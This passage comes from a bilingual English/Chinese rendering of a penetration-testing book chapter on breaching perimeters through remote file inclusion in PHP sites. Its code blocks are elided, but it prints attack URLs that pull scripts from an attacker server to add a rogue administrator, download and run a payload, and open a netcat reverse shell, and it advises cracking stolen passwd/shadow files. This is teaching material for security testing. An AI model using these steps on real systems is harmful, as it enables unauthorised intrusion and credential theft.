  zh: 即使在红队参与中，您也应该非常谨慎地对待这个问题。操纵外围防火墙可能会对组织产生不利影响。相反，您应该考虑突出显示您已经获得的访问权限，并要求为您的公共IP地址在半受信任或受保护的网络中开通访问权限，具体取决于参与的性质。请记住，除非设备具有可路由的IP地址，如公共或面向互联网的地址，否则您可能仍然无法从互联网上看到它，但您可能能够看到以前对您隐藏的端口和服务。一个例子是一个在防火墙后启用了RDP的Web服务器。一旦执行了外围规则的调整，您可能就可以访问Web服务器上的RDP。
- en: Gaining access through websites
  id: totrans-75
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 通过网站获取访问权限
- en: Exploiting websites that face the Internet will typically be the most viable
    option in cracking the perimeter of an organization. There are a number of ways
    of doing this, but the best vulnerabilities that provide access include **Structured
    Query Language** (**SQL**) **Structured Query Language injection** (**SQLi**),
    **Command-line Injection** (**CLI**), **Remote and Local File Inclusion** (**RFI**/**LFI**),
    and unprotected file uploads. There is a copious amount of information regarding
    the execution of vulnerabilities related to SQLi, CLI, LFI, and file uploads,
    but attacking through RFI has rather sparse information and vulnerability is prevalent.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 利用面向互联网的网站通常是攻击组织边界的最可行选项。有许多方法可以做到这一点，但提供访问权限的最佳漏洞包括**结构化查询语言**（**SQL**）**结构化查询语言注入**（**SQLi**），**命令行注入**（**CLI**），**远程和本地文件包含**（**RFI**/**LFI**）以及未受保护的文件上传。关于SQLi、CLI、LFI和文件上传漏洞的执行有大量信息，但通过RFI进行攻击的信息相对较少，漏洞也很普遍。
- en: The execution of file inclusion attacks
  id: totrans-77
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 文件包含攻击的执行
- en: 'To look for file inclusion vectors, you need to look for vectors that reference
    resources, either locally on the server such as files, or to other resources on
    the Internet:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 要查找文件包含向量，您需要查找引用资源的向量，无论是服务器上的文件还是互联网上的其他资源：
- en: '[http://www.example.website.com/?target=file.txt](http://www.example.website.com/?target=file.txt)'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: '[http://www.example.website.com/?target=file.txt](http://www.example.website.com/?target=file.txt)'
- en: 'Remote file inclusion typically references content from other sites or incorporations:'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 远程文件包含通常引用其他站点或合并的内容：
- en: '[http://www.example.website.com/?target=trustedsite.com/content.html](http://www.example.website.com/?target=trustedsite.com/content.html)'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: '[http://www.example.website.com/?target=trustedsite.com/content.html](http://www.example.website.com/?target=trustedsite.com/content.html)'
- en: The reason we highlight LFI in addition to the strict RFI example is that a
    file inclusion vulnerability may often work both ways for noticeable LFI and RFI
    vectors. It should be noted that just because there is a reference to a remote
    or local file does not mean that it is vulnerable.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 我们之所以强调LFI，除了严格的RFI示例之外，是因为文件包含漏洞通常可以在显着的LFI和RFI向量之间双向工作。应该注意的是，仅因为存在对远程或本地文件的引用并不意味着它是有漏洞的。
- en: 'After noticing the differences, we can attempt to determine whether the site
    would be viable for an attack depending on the underlying architecture: Windows
    or Linux/UNIX. First, we have to prepare our attack environment, which means standing
    up against an Internet-facing web server and positioning attack files in it. Fortunately,
    Python makes this easy with `SimpleHTTPServer`. First we create a directory that
    will host our files called `server`, then we cd to that directory and then we
    create the web server instance with the following command:'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 在注意到差异后，我们可以尝试确定站点是否适合进行攻击，这取决于底层架构：Windows还是Linux/UNIX。首先，我们必须准备好我们的攻击环境，这意味着建立一个面向互联网的Web服务器，并在其中放置攻击文件。幸运的是，Python通过`SimpleHTTPServer`可以轻松实现这一点。首先，我们创建一个将托管我们文件的目录，名为`server`，然后我们cd到该目录，然后使用以下命令创建Web服务器实例：
- en: '[PRE7]'
  id: totrans-84
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'You can then visit the site by entering the host IP address with port number
    8000 in the **Uniform Resource Locator** (**URL**) request bar separated by a
    column. Once you do this, you will see a number of requests going to the server
    to get information. This new server, to which you have just stood up, can be used
    to reference scripts to be run on the target server. This screenshot shows the
    relevant requests being made to the server:'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，您可以通过在**统一资源定位符**（**URL**）请求栏中输入带有端口号8000的主机IP地址，用冒号分隔，访问该站点。这样做后，您将看到向服务器发送的许多请求以获取信息。您刚刚建立的新服务器可以用来引用要在目标服务器上运行的脚本。此屏幕截图显示了发送到服务器的相关请求：
- en: '![The execution of file inclusion attacks](img/B04315_07_08.jpg)'
  id: totrans-86
  prefs: []
  type: TYPE_IMG
  zh: '![文件包含攻击的执行](img/B04315_07_08.jpg)'
- en: As mentioned previously, other protocols are sometimes available to interact
    with on the target web server. If you have provided yourself more access to a
    semi-trusted network or DMZ by adding your IP address to an authorization list
    in a firewall or **Access Control List** (**ACL**), you may be able to see services
    such as a **Server Message Block** (**SMB**) or RDP. So, depending on the environment,
    you may not have to provide additional access to yourself; just cracking the web
    server could provide you with enough access.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，有时可以使用其他协议与目标Web服务器进行交互。如果您通过将IP地址添加到防火墙或访问控制列表（ACL）的授权列表中，为自己提供了对半受信任网络或DMZ的更多访问权限，您可能能够看到诸如**服务器消息块**（**SMB**）或RDP之类的服务。因此，根据环境，您可能不必为自己提供额外的访问权限；只需破解Web服务器可能就足以为您提供足够的访问权限。
- en: Most file inclusion vulnerabilities are related to **Hypertext Preprocessor**
    (**PHP**) websites. Other language sets can be vulnerable, but PHP-based sites
    are the most common. So let's create some PHP scripts disguised as text files
    to verify the vulnerability and exploit the underlying server.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数文件包含漏洞与**PHP**网站相关。其他语言集可能存在漏洞，但基于PHP的站点最常见。因此，让我们创建一些伪装成文本文件的PHP脚本来验证漏洞并利用底层服务器。
- en: Verifying an RFI vulnerability
  id: totrans-89
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 验证RFI漏洞
- en: 'When you suspect that you have found an RFI exposure, you will need to verify
    that there is actually a vulnerability before exploiting it. First, start up a
    `tcpdump` service on the Internet-facing server and make it listen for **Internet
    Control Message Protocol** (**ICMP**) echoes with the following command:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 当您怀疑自己发现了RFI漏洞时，您需要在利用之前验证是否实际存在漏洞。首先，在面向互联网的服务器上启动`tcpdump`服务，并使其监听带有以下命令的**Internet
    Control Message Protocol**（**ICMP**）回显：
- en: '[PRE8]'
  id: totrans-91
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'This command will produce a file that will capture all of these messages sent
    by a `ping` command. Ping the exposed web server, find the actual IP address for
    the server, and record it. Then, create the following PHP file, which is stored
    as a text file called `ping.txt`:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令将生成一个文件，其中将捕获由`ping`命令发送的所有消息。对暴露的Web服务器进行ping操作，找到服务器的实际IP地址，并记录下来。然后，创建以下PHP文件，将其存储为名为`ping.txt`的文本文件：
- en: '[PRE9]'
  id: totrans-93
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'You can now execute the attack by referencing the file with the following command:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 您现在可以通过以下命令引用文件来执行攻击：
- en: '[http://www.example.website.com/?target=70.106.216.176:8000/server/ping.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/ping.txt)'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: '[http://www.example.website.com/?target=70.106.216.176:8000/server/ping.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/ping.txt)'
- en: 'Once the attack has been executed, you can review the **Packet Capture (PCAP)**
    with the following command:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦攻击执行完毕，您可以使用以下命令查看**数据包捕获（PCAP）**：
- en: '[PRE10]'
  id: totrans-97
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: If you see ICMP echoes from the same server as the one you pinged, then you
    know that the server is vulnerable to RFI.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您从您ping的同一台服务器看到ICMP回显，那么您就知道该服务器容易受到RFI的攻击。
- en: Exploiting the hosts through RFI
  id: totrans-99
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 通过RFI利用主机
- en: 'When you find a Windows host that is vulnerable, it is often running as a privileged
    account. So, to begin, it may be useful to add another local administrator account
    to the system through a PHP script. This is done by creating the following script
    and writing it to a text file such as `account.txt`:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 当您找到一个易受攻击的Windows主机时，通常会以特权帐户运行。因此，首先，通过PHP脚本向系统添加另一个本地管理员帐户可能是有用的。通过创建以下脚本并将其写入诸如`account.txt`之类的文本文件来完成这一点：
- en: '[PRE11]'
  id: totrans-101
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'Now all we have to do is reference the script from our exposed server, like
    this:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们所要做的就是从我们暴露的服务器引用脚本，就像这样：
- en: '[http://www.example.website.com/?target=70.106.216.176:8000/server/account.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/account.txt)'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: '[http://www.example.website.com/?target=70.106.216.176:8000/server/account.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/account.txt)'
- en: If possible, this will create a new malicious local administrator on the server,
    which we can use to gain access to the server. If the system had RDP exposed to
    the Internet, our job would have been done here, and we would just log in to the
    system directly with our new account. If this is not the case, then we would need
    to find another way to exploit the system; to do that, we are going to use actual
    payloads.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 如果可能的话，这将在服务器上创建一个新的恶意本地管理员，我们可以使用它来访问服务器。如果系统的RDP暴露在互联网上，我们的工作就完成了，我们只需使用新帐户直接登录系统。如果不是这种情况，那么我们需要找到另一种方法来利用系统；为此，我们将使用实际的有效负载。
- en: Create a payload as highlighted in [Chapter 5](ch05.html "Chapter 5. Exploiting
    Services with Python"), *Exploiting Services with Python*, and move it to the
    directory that is used to store the referenced files.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个如[第5章](ch05.html "第5章。使用Python利用服务")*使用Python利用服务*中所述的有效负载，并将其移动到用于存储引用文件的目录中。
- en: Tip
  id: totrans-106
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: The best LPORTs to use for this attack are port 80, port 443, and port 53\.
    Just make sure that you have no conflicts for these services.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 用于此攻击的最佳LPORT是端口80、端口443和端口53。只需确保这些服务没有冲突即可。
- en: 'Create a new PHP script that will be able to directly download the file and
    execute it, called `payload_execute.txt`:'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个新的PHP脚本，可以直接下载文件并执行它，名为`payload_execute.txt`：
- en: '[PRE12]'
  id: totrans-109
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'Now, set up your listener (as detailed in [Chapter 5](ch05.html "Chapter 5. Exploiting
    Services with Python"), *Exploiting Services with Python*) to listen for the defined
    local port. Finally, load the new script into the RFI request and watch your new
    potential shell appear:'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，设置监听器（如[第5章](ch05.html "第5章。使用Python利用服务")*使用Python利用服务*中详细说明的）以侦听定义的本地端口。最后，将新脚本加载到RFI请求中，观察您的新潜在shell出现：
- en: '[http://www.example.website.com/?target=70.106.216.176:8000/server/payload_execute.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/payload_execute.txt)'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: '[http://www.example.website.com/?target=70.106.216.176:8000/server/payload_execute.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/payload_execute.txt)'
- en: These are samples of how you can take advantage of a Windows host, but what
    if it is a Linux system? Depending on the permission structure of the host, it
    may be more difficult to gain a shell. That said, you can potentially look around
    the localhost to identify local files and repositories that may contain clear
    text passwords.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 这些是您可以利用Windows主机的样本，但如果是Linux系统呢？根据主机的权限结构，可能更难获得shell。也就是说，您可以潜在地查看本地主机，以识别可能包含明文密码的本地文件和存储库。
- en: 'Linux and Unix hosts provide attackers with the benefit of typically having
    `netcat` and several scripting languages installed. Each of these could provide
    a command shell back to an attacker''s listening system. As an example of this,
    set up a `netcat` listener on an Internet-facing host with the following command:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: Linux和Unix主机通常安装了`netcat`和几种脚本语言，这为攻击者提供了好处。每种语言都可以提供一个命令shell返回到攻击者的监听系统。例如，使用以下命令在面向互联网的主机上设置`netcat`监听器：
- en: '[PRE13]'
  id: totrans-114
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'Then, create a PHP script stored in a text file such as `netcat.txt`:'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，创建一个存储在文本文件中的PHP脚本，例如`netcat.txt`：
- en: '[PRE14]'
  id: totrans-116
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'Next, run the script by referencing the script in the URL as shown previously:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，通过引用先前显示的URL中的脚本来运行脚本：
- en: '[http://www.example.website.com/?target=70.106.216.176:8000/server/netcat.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/netcat.txt)'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: '[http://www.example.website.com/?target=70.106.216.176:8000/server/netcat.txt](http://www.example.website.com/?target=70.106.216.176:8000/server/netcat.txt)'
- en: Note
  id: totrans-119
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: There are several examples that show how to set up other backdoors on a system,
    as highlighted at [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 有几个示例显示了如何在系统上设置其他后门，如[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)中所示。
- en: For both Windows and Linux hosts, there is the `php_include` exploit for Metasploit,
    which allows you to inject an attack directly into RFI. PHP Meterpreters are limited
    and not very stable, so you would still need to download a full Meterpreter and
    execute it after you gain your foothold on a Windows system. On Linux systems,
    you should extract the `passwd` and `shadow` files and crack them to gain true
    local access.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 对于Windows和Linux主机，Metasploit有`php_include`漏洞，允许您直接将攻击注入到RFI中。 PHP Meterpreter受限且不太稳定，因此在在Windows系统上获得立足点后，仍需要下载完整的Meterpreter并执行。在Linux系统上，您应该提取`passwd`和`shadow`文件并破解它们以获得真正的本地访问。
- en: Summary
  id: totrans-122
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: This chapter highlighted common ways to crack the perimeter against specific
    services that are exposed. However, we did not cover the most common method of
    cracking the perimeter, which is phishing. Phishing, a type of social engineering,
    is an art unto itself and could take several chapters to describe, but you should
    know that real attackers used to phish if they could not find an easy method to
    get into the environment. Today, malicious actors typically start with phishing
    because it is easy to lure victims.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 本章重点介绍了针对特定服务的常见入侵方法。然而，我们没有涵盖最常见的入侵方法，即网络钓鱼。网络钓鱼是一种社会工程学的类型，是一门艺术，可能需要几章来描述，但您应该知道，真正的攻击者在找不到进入环境的简单方法时通常会使用网络钓鱼。今天，恶意行为者通常从网络钓鱼开始，因为很容易诱使受害者上钩。
- en: After these entry vectors, assessors and malicious actors watch for newly patched
    zero-days, such as Shellshock and Heartbleed, which were identified in 2014\.
    Examples like these are often exploitable even months after a new patch is provided,
    but what if you think you have found a vulnerability in an exposed service for
    which there is no exploit available, or you have discovered a potential zero-day?
    Though rarely, penetration testers can be granted the opportunity to test potential
    zero-days, but typically in a more controlled environment prove a concept of compromise.
    In the next chapter, we will discuss this in more depth.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 在这些入侵途径之后，评估者和恶意行为者会寻找新修补的零日漏洞，例如2014年发现的Shellshock和Heartbleed。像这样的例子通常在提供新补丁几个月后仍然是可利用的，但如果您认为在暴露的服务中发现了漏洞，而没有可用的漏洞利用，或者发现了潜在的零日漏洞，该怎么办呢？虽然很少见，渗透测试人员有时会获得测试潜在零日漏洞的机会，但通常在更受控制的环境中证明妥协的概念。在下一章中，我们将更深入地讨论这个问题。
